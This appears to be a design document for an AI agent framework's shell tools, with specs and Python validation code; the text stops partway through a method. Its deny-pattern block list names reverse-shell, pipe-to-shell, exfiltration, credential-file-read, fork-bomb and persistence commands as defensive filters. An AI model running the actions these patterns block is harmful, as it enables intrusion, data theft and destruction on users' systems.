# Product Requirements Document (PRD)
# RawAgents Built-in Command Execution Tools

**Version:** 2.0
**Date:** February 2026
**Status:** Draft (Comprehensive Revision)
**Author:** Tawab Safi

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Background & Motivation](#2-background--motivation)
3. [Goals & Non-Goals](#3-goals--non-goals)
4. [Tool Inventory](#4-tool-inventory)
5. [Tool Specifications](#5-tool-specifications)
6. [Security Architecture](#6-security-architecture)
7. [Implementation Approach](#7-implementation-approach)
8. [Reference Implementations](#8-reference-implementations)
9. [Testing Strategy](#9-testing-strategy)
10. [Project Structure](#10-project-structure)
11. [Development Process](#11-development-process)
12. [Error Handling and Logging](#12-error-handling-and-logging)

---

## 1. Executive Summary

### 1.1 What We're Building

The **Command Execution Tools** module (`rawagents.tools.builtin.shell`) provides the core shell/bash execution capabilities needed to build Claude Code-like agents. These tools enable agents to execute shell commands, run tests, install dependencies, interact with git, and automate system tasks.

Following RawAgents' **"Primitives over Frameworks"** philosophy, each tool is:
- A standalone, single-purpose function
- Independently testable
- Composable with other tools
- Usable without the full RawAgents framework

### 1.2 Key Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| **Execution Model** | `asyncio.create_subprocess_shell` | Async-native, non-blocking, supports timeout |
| **Shell** | User's default shell (`$SHELL`), with blacklist for incompatible shells (fish, nushell); falls back to `/bin/zsh` (macOS) or `/bin/bash` (Linux) | Matches user expectations while preventing POSIX-incompatible shell failures |
| **Working Directory** | Persistent across commands | Matches Claude Code behavior |
| **Environment Variables** | NOT persistent (fresh shell per command) | Matches Claude Code; use `env_file` for persistence |
| **Timeout Default** | 120 seconds (max 600 seconds) | Prevents runaway processes; configurable via context |
| **Background Processes** | Tracked by process ID | Enables monitoring long-running tasks |
| **Output Streaming** | Real-time line-by-line for background processes | Prevents deadlocks, enables progress monitoring |
| **Security** | Multi-layer (validation → permissions → sandbox) | Defense in depth; supports bubblewrap/seatbelt |

### 1.3 Tools Summary

| Tool | Purpose | Priority |
|------|---------|----------|
| `bash` | Execute shell commands with timeout | P0 |
| `bash_output` | Read output from background processes | P0 |
| `kill_shell` | Terminate a running shell process | P0 |

---

## 2. Background & Motivation

### 2.1 Problem Statement

To build Claude Code-like agents with RawAgents, developers need reliable command execution tools that:

1. **Execute arbitrary shell commands** - Run tests, build projects, interact with git
2. **Handle long-running processes** - Background tasks that exceed response time limits
3. **Provide proper timeout handling** - Prevent runaway processes from consuming resources
4. **Are secure** - Prevent command injection, support sandboxing
5. **Work cross-platform** - Linux, macOS, and Windows (WSL2)

### 2.2 Why Not Use Existing Packages?

| Option | Issue |
|--------|-------|
| `subprocess.run()` | Blocking, no native async support |
| `asyncio.create_subprocess_exec()` | No shell builtins, complex escaping |
| Raw `os.system()` | No output capture, no timeout |

### 2.3 Our Approach

Build async-native shell execution with:
- `asyncio.create_subprocess_shell()` for shell command execution
- Process management for background tasks
- Integration with SecurityContext for workspace boundaries
- Optional sandbox integration for OS-level isolation

---

## 3. Goals & Non-Goals

### 3.1 Goals

**G1: Feature Parity with Claude Code**
- Execute shell commands with output capture
- Support background processes
- Persistent working directory

**G2: Security by Default**
- Command allowlist/denylist patterns
- Working directory restrictions
- Optional OS-level sandbox integration

**G3: Robust Process Management**
- Proper timeout handling with graceful termination
- Kill process trees (not just parent)
- Clean resource cleanup

**G4: LLM-Optimized Output**
- Truncation with helpful messages
- Clear error messages with exit codes
- Streaming output for long commands

**G5: Testability**
- Each tool independently testable
- Mock process support
- Comprehensive test coverage

### 3.2 Non-Goals

**NG1: Interactive Commands**
- Commands requiring stdin interaction (vim, less, etc.) are not supported
- Use `--no-edit`, `--non-interactive` flags instead

**NG2: GUI Applications**
- No X11/Wayland display support
- Headless execution only

**NG3: Remote Execution**
- Local execution only
- SSH/remote shells out of scope

**NG4: Full Shell Emulation**
- We don't implement a shell; we delegate to the system shell

---

## 4. Tool Inventory

### 4.1 Priority 0 (Must Have)

All three tools are essential for agent shell operations:

```
┌─────────────────────────────────────────────────────────────────┐
│                    PRIORITY 0: CORE TOOLS                        │
├─────────────────────────────────────────────────────────────────┤
│  bash        │ Execute shell commands with timeout               │
│  bash_output │ Read output from background processes             │
│  kill_shell  │ Terminate a running shell process                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5. Tool Specifications

### 5.1 Bash Tool

**Purpose:** Execute shell commands in a persistent bash session.

**Parameters:**

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `command` | str | ✅ | - | The shell command to execute |
| `description` | str | ❌ | None | Clear description of what this command does (for logging/audit) |
| `timeout` | int | ❌ | 120000 | Timeout in milliseconds (max 600000ms / 10 minutes) |
| `run_in_background` | bool | ❌ | False | Run command in background, return process ID |
| `dangerously_disable_sandbox` | bool | ❌ | False | Override sandbox mode and run commands without sandboxing. **Use with extreme caution.** |

**Output Format:**

For successful commands:
```
<stdout content>
```

For failed commands:
```
Error: Command failed with exit code <N>
<stderr content>
```

For background commands:
```
Started background process with PID: <pid>
```

**Behavior:**

- **Shell Selection**:
  - Uses `$SHELL` environment variable if set and POSIX-compatible
  - Incompatible shells (fish, nushell) are blacklisted with warning; falls back to platform default
  - Falls back to `/bin/zsh` on macOS, `/bin/bash` on Linux, `cmd.exe` on Windows
  - Shell can be configured via `ShellSecurityContext.shell_path` (overrides all detection)

- **Working Directory**:
  - Persists between commands in the same session
  - Initial working directory is the workspace root
  - Commands can change directory with `cd`

- **Timeout Handling**:
  - Default timeout: 120 seconds (120000ms)
  - Maximum timeout: 600 seconds (600000ms)
  - On timeout: SIGTERM first, then SIGKILL after 5 seconds
  - Kills entire process group (including child processes)

- **Output Handling**:
  - Combined stdout/stderr (interleaved)
  - Dual truncation: at 2000 lines OR 50KB bytes (whichever is hit first)
  - Full truncated output persisted to temp file with path in truncation message
  - Binary output detection and warning

- **Environment**:
  - Inherits current process environment
  - Custom environment variables can be added via context
  - Environment changes within a command do NOT persist (each command is a new shell process)

- **Shell State**:
  - **Working directory DOES persist** between commands (tracked by RawAgents)
  - **Environment variables DO NOT persist** between commands (each is a new process)
  - **Shell aliases/functions DO NOT persist** (shell state resets each command)
  - For persistent env vars, use: `export VAR=value && <your-command>` in a single command
  - For complex scripts, write to a file and execute: `bash ./script.sh`

**Safety Rules (Important for LLM Agents):**

The following rules are critical for safe agent operation:

1. **Never run destructive git commands** without explicit user request:
   - `git push --force`
   - `git reset --hard`
   - `git checkout .`
   - `git restore .`
   - `git clean -f`
   - `git branch -D`

2. **Never skip hooks**:
   - `--no-verify`
   - `--no-gpg-sign`

3. **Never use interactive flags** (not supported):
   - `git rebase -i`
   - `git add -i`
   - `-i` or `--interactive` flags

4. **Use HEREDOC for commit messages**:
   ```bash
   git commit -m "$(cat <<'EOF'
   Commit message here.

   Co-Authored-By: Agent <agent@example.com>
   EOF
   )"
   ```

5. **Quote file paths with spaces**:
   ```bash
   # Correct:
   cd "/path/with spaces/directory"

   # Incorrect (will fail):
   cd /path/with spaces/directory
   ```

**Example:**

```python
# Simple command
result = await bash(
    command="git status",
    description="Show working tree status",
)
# Returns: "On branch main\nnothing to commit..."

# Command with timeout
result = await bash(
    command="npm test",
    description="Run test suite",
    timeout=300000,  # 5 minutes
)

# Background command
result = await bash(
    command="npm run dev",
    description="Start development server",
    run_in_background=True,
)
# Returns: "Started background process with PID: 12345"

# Chained commands
result = await bash(
    command="cd /project && git add . && git commit -m 'Update'",
    description="Stage and commit changes",
)
```

---

### 5.2 BashOutput Tool

**Purpose:** Read output from a background bash command.

**Parameters:**

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `pid` | str | ✅ | - | Process ID of the background command |
| `timeout` | int | ❌ | 5000 | Timeout in ms to wait for new output |

**Output Format:**

```
<new output since last read>

Process status: running | completed (exit code N) | terminated
```

**Behavior:**

- **Output Buffering**:
  - Maintains internal buffer per process
  - Returns only new output since last read
  - Truncated at 50KB with continuation message

- **Process State**:
  - Reports whether process is still running
  - Reports exit code if completed
  - Handles process not found gracefully

- **Timeout**:
  - Waits up to `timeout` ms for new output
  - Returns immediately if process has completed
  - Returns partial output if available before timeout

**Example:**

```python
# Start background process
result = await bash(
    command="npm run build",
    run_in_background=True,
)
# Returns: "Started background process with PID: 12345"

# Check output periodically
output = await bash_output(pid="12345", timeout=10000)
# Returns: "Compiling...\n\nProcess status: running"

# Later check
output = await bash_output(pid="12345")
# Returns: "Build complete!\n\nProcess status: completed (exit code 0)"
```

---

### 5.3 KillShell Tool

**Purpose:** Terminate a running shell process.

**Parameters:**

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `pid` | str | ✅ | - | Process ID to terminate |
| `force` | bool | ❌ | False | Use SIGKILL instead of SIGTERM |

**Output Format:**

```
Process <pid> terminated successfully.
```

Or on error:
```
Error: Process <pid> not found.
Error: Failed to terminate process <pid>: <reason>
```

**Behavior:**

- **Termination Strategy**:
  - Default: SIGTERM (allows graceful shutdown)
  - With `force=True`: SIGKILL (immediate termination)
  - Kills entire process group (child processes included)

- **Process Group Handling**:
  - Uses `os.killpg()` to terminate process groups
  - Prevents orphaned child processes
  - Requires `start_new_session=True` during process creation

- **Cleanup**:
  - Removes process from tracking registry
  - Closes associated pipes and file handles
  - Waits for process to fully terminate

**Example:**

```python
# Graceful termination
result = await kill_shell(pid="12345")
# Returns: "Process 12345 terminated successfully."

# Forced termination
result = await kill_shell(pid="12345", force=True)
# Returns: "Process 12345 terminated successfully."
```

---

### 5.4 Cancellation / Abort Pattern

Running commands can be cancelled at any point using the `kill_shell` tool. The cancellation follows a graceful-to-forced escalation:

```
Agent detects command is taking too long or is wrong
                    │
                    ▼
        kill_shell(pid="<pid>")
                    │
                    ▼
          SIGTERM sent to process group
          (allows graceful shutdown)
                    │
                    ├── Process exits within 5 seconds → ✅ Done
                    │
                    └── Process still running after 5 seconds
                                    │
                                    ▼
                          SIGKILL sent to process group
                          (forced termination) → ✅ Done
```

**Cancellation Scenarios:**

| Scenario | Action | Tool |
|----------|--------|------|
| Foreground command running too long | Timeout handles it automatically (SIGTERM → SIGKILL) | `bash` (built-in) |
| Background process no longer needed | Agent calls `kill_shell(pid=...)` | `kill_shell` |
| Background process hung/unresponsive | Agent calls `kill_shell(pid=..., force=True)` | `kill_shell` |
| User requests abort | Framework cancels the tool call; process group is cleaned up | Framework-level |

**Agent Usage Pattern:**

```python
# Start a long-running command
result = await bash("npm run build", run_in_background=True)
pid = result.split("PID: ")[1].strip()

# ... later, decide to cancel ...
await kill_shell(pid=pid)

# For stuck processes that ignore SIGTERM:
await kill_shell(pid=pid, force=True)
```

---

## 6. Security Architecture

The Security Architecture for command execution is **critical** because shell commands can potentially execute arbitrary code. This section defines a multi-layered defense strategy.

### 6.1 Overview: Three Layers of Security

```
┌─────────────────────────────────────────────────────────────────┐
│                     USER/AGENT REQUEST                           │
│                    "bash rm -rf /"                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 1: COMMAND VALIDATION (ShellSecurityContext)              │
│  ─────────────────────────────────────────────────────────────  │
│  1. Check against deny patterns (rm -rf, dd if=, etc.)          │
│  2. Check against allow patterns if restrictive mode             │
│  3. Validate working directory is within workspace               │
│  4. REJECT if command matches deny pattern                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 2: PERMISSION CHECK (Permission System)                   │
│  ─────────────────────────────────────────────────────────────  │
│  1. Check deny rules → BLOCK if matched                         │
│  2. Check allow rules → PERMIT if matched                        │
│  3. Check ask rules → PROMPT USER if matched                     │
│  4. Default → ASK for shell commands                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 3: OS-LEVEL SANDBOX (Optional)                            │
│  ─────────────────────────────────────────────────────────────  │
│  • Linux: bubblewrap (bwrap)                                    │
│  • macOS: sandbox-exec (seatbelt)                               │
│  • Enforces filesystem and network restrictions at kernel level  │
│  • Even if command passes Layer 1-2, sandbox restricts access    │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     COMMAND EXECUTED                             │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 How Claude Code Implements Sandboxing

Claude Code's sandbox architecture provides production-grade security:

| Component | Technology | Purpose |
|-----------|------------|---------|
| **Filesystem Isolation** | bubblewrap (Linux), seatbelt (macOS) | Restrict read/write to workspace only |
| **Network Isolation** | Proxy through Unix socket | Allow only approved domains |
| **Process Isolation** | New session, process groups | Kill entire process tree on timeout |

**Key Achievement:** Claude Code's sandbox reduces permission prompts by **84%** because safe operations are auto-allowed within the sandbox boundary.

**Anthropic's Open-Source Sandbox Runtime:**

Anthropic has open-sourced their sandboxing implementation:
- Repository: [github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- npm package: `@anthropic-ai/sandbox-runtime`
- Supports both Linux (bubblewrap) and macOS (seatbelt)

### 6.3 Layer 1: ShellSecurityContext (Command Validation)

**File:** `rawagents/tools/builtin/shell/_security.py`

```python
"""Security module for shell/command execution tools.

This module provides command validation and execution boundary enforcement
to prevent dangerous command execution and unauthorized system access.

CRITICAL: All shell operations MUST use this module for command validation.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, Pattern
import fnmatch


class CommandSecurityError(PermissionError):
    """Raised when a command execution violates security constraints.

    Attributes:
        command: The command that was rejected.
        pattern: The deny pattern that matched (if applicable).
        reason: Human-readable reason for rejection.
    """

    def __init__(
        self,
        message: str,
        command: str,
        pattern: Optional[str] = None,
        reason: Optional[str] = None,
    ):
        super().__init__(message)
        self.command = command
        self.pattern = pattern
        self.reason = reason


# Default dangerous command patterns
# Based on OWASP Command Injection guidelines and Claude Code security patterns
# Reference: https://owasp.org/www-community/attacks/Command_Injection
_DEFAULT_DENY_PATTERNS: list[str] = [
    # ==========================================================================
    # DESTRUCTIVE FILE OPERATIONS
    # ==========================================================================
    "rm -rf /*",
    "rm -rf /",
    "rm -rf ~/*",
    "rm -rf ~",
    "rm -rf .",
    "rm -rf ..",
    "rmdir /*",
    "rm -rf /home/*",
    "rm -rf /var/*",
    "rm -rf /etc/*",
    "rm -rf /usr/*",

    # ==========================================================================
    # DISK AND PARTITION OPERATIONS
    # ==========================================================================
    "dd if=*",
    "mkfs*",
    "fdisk*",
    "parted*",
    "wipefs*",
    "shred *",

    # ==========================================================================
    # PRIVILEGE ESCALATION
    # ==========================================================================
    "sudo *",
    "sudo su*",
    "su *",
    "su -*",
    "doas *",
    "pkexec *",
    "runas *",
    # setuid/setgid manipulation
    "chmod +s *",
    "chmod u+s *",
    "chmod g+s *",

    # ==========================================================================
    # SYSTEM MODIFICATION
    # ==========================================================================
    "chmod 777 /*",
    "chmod -R 777 /*",
    "chown -R * /*",
    "chattr *",
    "setenforce *",
    # System service manipulation
    "systemctl disable*",
    "systemctl mask*",
    "service * stop",

    # ==========================================================================
    # DANGEROUS GIT OPERATIONS (without explicit permission)
    # ==========================================================================
    "git push --force*",
    "git push -f*",
    "git push *--force*",
    "git push *-f *",
    "git reset --hard*",
    "git clean -fd*",
    "git clean -f*",
    "git checkout -- .",
    "git restore .",
    "git branch -D *",

    # ==========================================================================
    # FORK BOMBS AND RESOURCE EXHAUSTION
    # ==========================================================================
    ":(){ :|:& };:",
    "*:(){ :|:& };:*",
    "fork()",
    "while true; do*",
    "yes |*",

    # ==========================================================================
    # CREDENTIAL AND HISTORY EXFILTRATION
    # ==========================================================================
    "cat ~/.bash_history",
    "cat ~/.zsh_history",
    "cat ~/.ssh/*",
    "cat /etc/shadow",
    "cat /etc/passwd",
    "cat ~/.netrc",
    "cat ~/.aws/*",
    "cat ~/.config/gcloud/*",
    "cat ~/.kube/config",
    "cat */.env",
    "cat *.pem",
    "cat *id_rsa*",
    "cat *id_ed25519*",
    # Reading sensitive files with other commands
    "less ~/.ssh/*",
    "more ~/.ssh/*",
    "head ~/.ssh/*",
    "tail ~/.ssh/*",

    # ==========================================================================
    # NETWORK EXFILTRATION (pipe to network tools)
    # ==========================================================================
    "*| curl *",
    "*| wget *",
    "*| nc *",
    "*| ncat *",
    "*| netcat *",
    "*> /dev/tcp/*",
    "*| telnet *",

    # ==========================================================================
    # PIPE-TO-SHELL ATTACKS (Remote Code Execution)
    # Multiple variations to catch common patterns
    # ==========================================================================
    "curl * | bash",
    "curl * | sh",
    "curl * | zsh",
    "wget * | bash",
    "wget * | sh",
    "wget * | zsh",
    # Without spaces around pipe
    "curl *|bash",
    "curl *|sh",
    "wget *|bash",
    "wget *|sh",
    # Using -s flag
    "curl -s* | bash",
    "curl -s* | sh",
    "wget -q* | bash",
    "wget -q* | sh",
    # Shell -c execution
    "sh -c \"curl *\"",
    "sh -c 'curl *'",
    "bash -c \"curl *\"",
    "bash -c 'curl *'",
    "sh -c \"wget *\"",
    "sh -c 'wget *'",
    "bash -c \"wget *\"",
    "bash -c 'wget *'",
    # Using eval
    "eval \"$(curl *\"",
    "eval \"$(wget *\"",
    "eval `curl *`",
    "eval `wget *`",

    # ==========================================================================
    # CHAINED COMMAND INJECTION PATTERNS
    # Reference: https://portswigger.net/web-security/os-command-injection
    # ==========================================================================
    # Semicolon chaining (cmd1; dangerous_cmd)
    "*; rm -rf *",
    "*; sudo *",
    "*; curl * | *sh*",
    "*; wget * | *sh*",
    "*;rm -rf *",
    "*;sudo *",
    # AND chaining (cmd1 && dangerous_cmd)
    "*&& rm -rf *",
    "*&& sudo *",
    "*&& curl * | *sh*",
    "*&& wget * | *sh*",
    "*&&rm -rf *",
    "*&&sudo *",
    # OR chaining (cmd1 || dangerous_cmd)
    "*|| rm -rf *",
    "*|| sudo *",
    "*|| curl * | *sh*",
    "*||rm -rf *",
    "*||sudo *",
    # Background execution chaining
    "*& rm -rf *",
    "*& sudo *",

    # ==========================================================================
    # COMMAND SUBSTITUTION INJECTION
    # ==========================================================================
    # $() substitution
    "*$(rm *)*",
    "*$(sudo *)*",
    "*$(curl * | *sh*)*",
    "*$(wget * | *sh*)*",
    # Backtick substitution
    "*`rm *`*",
    "*`sudo *`*",
    "*`curl *`*",
    "*`wget *`*",

    # ==========================================================================
    # ENVIRONMENT VARIABLE INJECTION
    # ==========================================================================
    "*=\"$(rm *\"*",
    "*='$(rm *'*",
    "*=\"`rm *`\"*",

    # ==========================================================================
    # REVERSE SHELLS
    # ==========================================================================
    "*/dev/tcp/*",
    "*bash -i*",
    "*bash -c*&>/dev/tcp/*",
    "*nc -e*",
    "*ncat -e*",
    "*nc -c*",
    "*ncat -c*",
    "*python*socket*connect*",
    "*python*pty.spawn*",
    "*perl*socket*",
    "*ruby*TCPSocket*",
    "*php -r*fsockopen*",
    "*socat *exec*",

    # ==========================================================================
    # CRYPTO MINING INDICATORS
    # ==========================================================================
    "*xmrig*",
    "*minerd*",
    "*cpuminer*",
    "*stratum+tcp*",
    "*nicehash*",

    # ==========================================================================
    # SCHEDULED TASKS / PERSISTENCE
    # ==========================================================================
    "crontab -r*",
    "crontab -e*",
    "at *",
    "echo * >> /etc/crontab",
    "echo * >> ~/.bashrc",
    "echo * >> ~/.zshrc",
    "echo * >> ~/.profile",

    # ==========================================================================
    # CONTAINER ESCAPE ATTEMPTS
    # ==========================================================================
    "*nsenter*",
    "*docker run*--privileged*",
    "*docker exec*",
    "mount *proc*",

    # ==========================================================================
    # OUTPUT REDIRECTION TO SYSTEM FILES
    # ==========================================================================
    "*> /etc/passwd*",
    "*> /etc/shadow*",
    "*> /etc/sudoers*",
    "*>> /etc/passwd*",
    "*>> /etc/shadow*",
    "*>> /etc/sudoers*",
    "*> ~/.ssh/authorized_keys*",
    "*>> ~/.ssh/authorized_keys*",
]


class SandboxNotAvailableError(RuntimeError):
    """Raised when sandboxing is enabled but sandbox tools are not available."""
    pass


@dataclass
class ShellSecurityContext:
    """Security context for shell command execution.

    This class enforces:
    1. Command pattern validation (deny dangerous patterns)
    2. Working directory restrictions
    3. Timeout limits
    4. Optional sandbox mode configuration
    5. Environment file sourcing for persistent environment variables

    The context also supports configuration via environment variables:
    - RAWAGENTS_BASH_DEFAULT_TIMEOUT_MS: Override default timeout
    - RAWAGENTS_BASH_MAX_TIMEOUT_MS: Override max timeout
    - RAWAGENTS_ENV_FILE: Path to file sourced before each command

    Example:
        >>> ctx = ShellSecurityContext(workspace="/home/user/project")
        >>> ctx.validate_command("git status")  # OK
        >>> ctx.validate_command("rm -rf /")  # Raises CommandSecurityError

        # With environment file for persistent env vars
        >>> ctx = ShellSecurityContext(
        ...     workspace="/home/user/project",
        ...     env_file="/home/user/.project_env"
        ... )
    """

    workspace: Optional[str] = None
    """Root directory for command execution. Commands are restricted to this directory."""

    deny_patterns: list[str] = field(default_factory=lambda: list(_DEFAULT_DENY_PATTERNS))
    """Shell glob patterns for commands that should never be executed."""

    allow_patterns: list[str] = field(default_factory=list)
    """If non-empty, only commands matching these patterns are allowed (allowlist mode)."""

    max_timeout: int = 600000  # 10 minutes
    """Maximum allowed timeout in milliseconds. Can be overridden via RAWAGENTS_BASH_MAX_TIMEOUT_MS."""

    default_timeout: int = 120000  # 2 minutes
    """Default timeout if not specified. Can be overridden via RAWAGENTS_BASH_DEFAULT_TIMEOUT_MS."""

    shell_path: Optional[str] = None
    """Custom shell path. If None, uses $SHELL or /bin/bash."""

    env_file: Optional[str] = None
    """Path to a shell script that will be sourced before each command.

    This enables persistent environment variables across commands:

        # ~/.project_env
        export DATABASE_URL="postgres://..."
        export API_KEY="..."

    Then commands will have access to these variables:
        >>> await bash("echo $DATABASE_URL")
        'postgres://...'

    Can also be set via RAWAGENTS_ENV_FILE environment variable.
    """

    maintain_project_working_dir: bool = False
    """If True, reset working directory to workspace after each command.

    Similar to Claude Code's CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR setting.
    Useful when you want cd commands to be temporary within a single command.
    """

    enable_sandbox: bool = False
    """Whether to wrap commands in OS-level sandbox."""

    sandbox_allow_network: bool = False
    """Whether to allow network access in sandboxed mode."""

    sandbox_allow_write_paths: list[str] = field(default_factory=list)
    """Paths where writing is allowed in sandbox mode (in addition to workspace)."""

    sandbox_deny_read_paths: list[str] = field(default_factory=lambda: [
        "~/.ssh",
        "~/.gnupg",
        "~/.aws",
        "~/.config/gcloud",
        "~/.kube",
        "~/.netrc",
        "~/.gitconfig",
        "~/.docker/config.json",
    ])
    """Paths to block reading even within sandbox."""

    # Internal state
    _resolved_workspace: Optional[Path] = field(default=None, init=False, repr=False)
    _current_directory: Optional[Path] = field(default=None, init=False, repr=False)
    _compiled_deny_patterns: list[Pattern] = field(default_factory=list, init=False, repr=False)
    _sandbox_available: Optional[bool] = field(default=None, init=False, repr=False)

    def __post_init__(self) -> None:
        """Initialize workspace, compile patterns, and load env config."""
        import os

        if self.workspace:
            self._resolved_workspace = Path(self.workspace).resolve()
            self._current_directory = self._resolved_workspace

        # Load timeout overrides from environment variables
        env_default_timeout = os.environ.get("RAWAGENTS_BASH_DEFAULT_TIMEOUT_MS")
        if env_default_timeout:
            try:
                self.default_timeout = int(env_default_timeout)
            except ValueError:
                pass  # Keep default if invalid

        env_max_timeout = os.environ.get("RAWAGENTS_BASH_MAX_TIMEOUT_MS")
        if env_max_timeout:
            try:
                self.max_timeout = int(env_max_timeout)
            except ValueError:
                pass

        # Load env_file from environment if not set
        if not self.env_file:
            self.env_file = os.environ.get("RAWAGENTS_ENV_FILE")

        # Validate env_file exists if specified
        if self.env_file and not Path(self.env_file).expanduser().exists():
            import warnings
            warnings.warn(
                f"env_file '{self.env_file}' does not exist. "
                "Environment sourcing will be skipped.",
                UserWarning,
            )

        # Compile deny patterns for faster matching
        # Use re.DOTALL to match across potential newlines in commands
        self._compiled_deny_patterns = [
            re.compile(fnmatch.translate(p), re.IGNORECASE | re.DOTALL)
            for p in self.deny_patterns
        ]

        # Check sandbox availability upfront if enabled
        if self.enable_sandbox:
            self._check_sandbox_availability()

    def _check_sandbox_availability(self) -> None:
        """Check if sandbox tools are available on this system.

        Raises:
            SandboxNotAvailableError: If sandbox is enabled but tools not found.
        """
        import platform
        import shutil

        system = platform.system()

        if system == "Linux":
            if not shutil.which("bwrap"):
                raise SandboxNotAvailableError(
                    "Sandbox enabled but bubblewrap (bwrap) is not installed. "
                    "Install with: apt install bubblewrap (Debian/Ubuntu) or "
                    "dnf install bubblewrap (Fedora/RHEL). "
                    "Alternatively, set enable_sandbox=False."
                )
        elif system == "Darwin":
            if not shutil.which("sandbox-exec"):
                raise SandboxNotAvailableError(
                    "Sandbox enabled but sandbox-exec is not available. "
                    "This should be built into macOS. Check your PATH or "
                    "set enable_sandbox=False."
                )
        elif system == "Windows":
            # No sandboxing on Windows
            import warnings
            warnings.warn(
                "Sandboxing is not supported on Windows. "
                "Commands will run without sandbox isolation.",
                UserWarning,
            )
            self._sandbox_available = False
            return

        self._sandbox_available = True

    def validate_command(self, command: str) -> None:
        """Validate a command against security constraints.

        Uses both full-match and search-based pattern matching to catch:
        1. Commands that ARE the dangerous pattern (e.g., "rm -rf /")
        2. Commands that CONTAIN the dangerous pattern (e.g., "echo hi; rm -rf /")

        Args:
            command: The shell command to validate.

        Raises:
            CommandSecurityError: If command violates security constraints.
        """
        if not command or not command.strip():
            raise CommandSecurityError(
                "Empty command is not allowed",
                command=command,
                reason="empty_command",
            )

        # Normalize command for pattern matching
        # Remove extra whitespace but preserve command structure
        normalized = " ".join(command.split())

        # Check deny patterns using BOTH match (anchored) and search (anywhere)
        for i, pattern in enumerate(self._compiled_deny_patterns):
            original_pattern = self.deny_patterns[i]

            # Method 1: Full match (pattern matches entire command)
            if pattern.match(normalized):
                raise CommandSecurityError(
                    f"Command blocked: matches dangerous pattern '{original_pattern}'",
                    command=command,
                    pattern=original_pattern,
                    reason="deny_pattern_match",
                )

            # Method 2: Search (pattern found anywhere in command)
            # This catches chained commands like "echo hello; rm -rf /"
            # Only do search for patterns that start with * (intended to match anywhere)
            if original_pattern.startswith("*"):
                if pattern.search(normalized):
                    raise CommandSecurityError(
                        f"Command blocked: contains dangerous pattern '{original_pattern}'",
                        command=command,
                        pattern=original_pattern,
                        reason="deny_pattern_found",
                    )

        # Additional heuristic: check for shell metacharacters that might indicate injection
        # This catches obfuscated or encoded commands
        shell_metacharacters = [";", "&&", "||", "|", "`", "$(", "${"]
        has_metachar = any(mc in command for mc in shell_metacharacters)

        if has_metachar:
            # Re-check each segment for dangerous patterns
            # Split on common command separators
            import shlex
            segments = re.split(r'[;&|]+', command)
            for segment in segments:
                segment = segment.strip()
                if not segment:
                    continue
                for i, pattern in enumerate(self._compiled_deny_patterns):
                    if pattern.match(segment) or pattern.search(segment):
                        raise CommandSecurityError(
                            f"Command blocked: segment '{segment}' matches dangerous pattern",
                            command=command,
                            pattern=self.deny_patterns[i],
                            reason="chained_command_injection",
                        )

        # If allowlist mode, check allow patterns
        if self.allow_patterns:
            allowed = False
            for pattern in self.allow_patterns:
                if fnmatch.fnmatch(normalized, pattern):
                    allowed = True
                    break
            if not allowed:
                raise CommandSecurityError(
                    "Command not in allowlist",
                    command=command,
                    reason="not_in_allowlist",
                )

    def validate_timeout(self, timeout: Optional[int]) -> int:
        """Validate and normalize timeout value.

        Args:
            timeout: Requested timeout in milliseconds.

        Returns:
            Validated timeout, clamped to max_timeout.
        """
        if timeout is None:
            return self.default_timeout

        if timeout <= 0:
            return self.default_timeout

        return min(timeout, self.max_timeout)

    # Shells with incompatible syntax that cannot reliably execute POSIX commands.
    # fish: different syntax (no && chaining, different variable expansion)
    # nushell (nu): structured data shell with fundamentally different command syntax
    # xonsh: Python-based shell with mixed Python/shell syntax
    # elvish: uses its own expression language, not POSIX-compatible
    # ion: Rust shell with incompatible syntax
    # murex: typed shell with its own scripting language
    # Reference: OpenCode issue #8716, Claude Code issue #11475
    INCOMPATIBLE_SHELLS: frozenset[str] = frozenset({
        "fish", "nu", "nushell", "xonsh", "elvish", "ion", "murex",
    })

    def get_shell(self) -> str:
        """Get the shell to use for command execution.

        Shell selection priority:
        1. Explicit ``shell_path`` configuration
        2. ``$SHELL`` environment variable (if compatible)
        3. Platform-appropriate default (``/bin/zsh`` on macOS, ``/bin/bash`` on Linux)
        4. ``/bin/sh`` as last resort

        Shells in ``INCOMPATIBLE_SHELLS`` (fish, nushell, xonsh, elvish, ion,
        murex) are automatically skipped because their syntax is not
        POSIX-compatible, which causes command parsing failures. When an
        incompatible shell is detected, a warning is emitted and the
        platform default is used instead.

        Returns:
            Path to shell executable.
        """
        import os
        import platform
        import warnings

        if self.shell_path:
            return self.shell_path

        # Use $SHELL if set AND compatible
        shell = os.environ.get("SHELL")
        if shell and Path(shell).exists():
            shell_name = Path(shell).name
            if shell_name in self.INCOMPATIBLE_SHELLS:
                warnings.warn(
                    f"Default shell '{shell_name}' is not POSIX-compatible. "
                    f"Using platform default instead. Set shell_path to override.",
                    UserWarning,
                    stacklevel=2,
                )
            else:
                return shell

        # Platform-appropriate default
        # macOS: /bin/zsh is the default shell since macOS Catalina (10.15)
        # Linux: /bin/bash is the standard default
        system = platform.system()
        if system == "Darwin" and Path("/bin/zsh").exists():
            return "/bin/zsh"
        if Path("/bin/bash").exists():
            return "/bin/bash"

        # Last resort
        return "/bin/sh"

    def get_working_directory(self) -> Path:
        """Get the current working directory for commands.

        Returns:
            Current working directory path.
        """
        if self._current_directory:
            return self._current_directory
        if self._resolved_workspace:
            return self._resolved_workspace
        return Path.cwd()

    _previous_directory: Optional[Path] = field(default=None, init=False, repr=False)

    def update_working_directory(self, new_dir: str) -> None:
        """Update the working directory after a cd command.

        Handles special cases:
